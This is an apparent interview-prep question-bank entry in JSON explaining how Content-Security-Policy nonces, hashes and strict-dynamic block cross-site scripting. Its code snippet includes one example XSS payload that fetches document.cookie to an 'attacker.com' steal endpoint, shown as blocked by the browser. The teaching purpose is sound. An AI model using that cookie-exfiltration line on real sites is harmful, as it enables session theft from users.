    "id": "int-cn-097",
    "topic_id": "topic-cn",
    "category": "CORE_CS",
    "subject": "COMPUTER_NETWORKS",
    "subject_label": "Computer Networks",
    "title": "Explain Content-Security-Policy (CSP) headers and how nonces/hashes prevent Cross-Site Scripting (XSS).",
    "answer": "Cross-Site Scripting (XSS) occurs when an attacker tricks a web application into executing malicious JavaScript inside a victim's browser session.\n\nWhat is Content-Security-Policy (CSP - W3C Level 3)?\nAn HTTP response header that restricts which scripts, styles, images, and fonts the browser is permitted to load and execute, providing defense-in-depth against XSS:\n`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com`\n\nWhy Host-Based Whitelisting Failed:\nHistorically, developers whitelisted CDNs: `script-src https://cdnjs.cloudflare.com`. Attackers bypassed this by finding vulnerable JSONP endpoints or outdated AngularJS libraries hosted on that exact same whitelisted CDN!\n\nModern Strict CSP using Nonces and Hashes:\n1. Cryptographic Nonce (`'nonce-<base64>'`):\n- For every HTTP request, the web server generates a unique, cryptographically random 128-bit base64 nonce.\n- The server sets the CSP header: `script-src 'nonce-rAnd0m123' 'strict-dynamic'`.\n- Only `<script nonce=\"rAnd0m123\">` tags carrying this exact matching nonce are executed by the browser!\n- If an attacker injects a malicious `<script>stealCookie()</script>` via an input field, the injected script lacks the secret server-generated nonce, and the browser BLOCKS IT with an error!\n2. Cryptographic Hash (`'sha256-...'`):\n- Whitelists specific inline script contents matching an exact SHA-256 digest.\n- `strict-dynamic`: Instructs the browser that a legitimate nonced script is allowed to dynamically load additional subordinate scripts.",
    "bullet_points": [
      "CSP restricts which scripts, images, and resources browsers are permitted to load.",
      "Disables `eval()` and inline `<script>` blocks by default to stop XSS injection.",
      "Cryptographic nonces (`'nonce-...'`) whitelist legitimate scripts per-request using random tokens.",
      "Injected XSS payloads lack the dynamic server nonce and are blocked from executing by the browser engine."
    ],
    "code_snippet": {
      "language": "bash",
      "code": "/* Strict CSP Implementation */\n\nServer Response Header:\nContent-Security-Policy: \n    default-src 'self'; \n    script-src 'nonce-dGVzdDEyMzQ1Njc4' 'strict-dynamic'; \n    object-src 'none'; \n    base-uri 'none';\n\nHTML Document:\n<!-- Legitimate script (Executes perfectly): -->\n<script nonce=\"dGVzdDEyMzQ1Njc4\" src=\"/js/app.js\"></script>\n\n<!-- Attacker XSS Injection (BLOCKED BY BROWSER!): -->\n<script>fetch('https://attacker.com/steal?c=' + document.cookie);</script>\n<!-- Console: Refused to execute inline script because it violates CSP directive -->"
    },
    "pro_tip": "Always configure `report-uri /api/csp-report` or `report-to`! When CSP blocks an unauthorized script or XSS attempt, the browser automatically POSTs a JSON incident report to your logging endpoint, giving real-time visibility into active attacks!",
    "company_tags": [
      "Google",
      "Meta",
      "Amazon",
      "Microsoft",
      "Stripe"
    ],
    "frequency": "VERY_HIGH",
    "difficulty": "HARD",
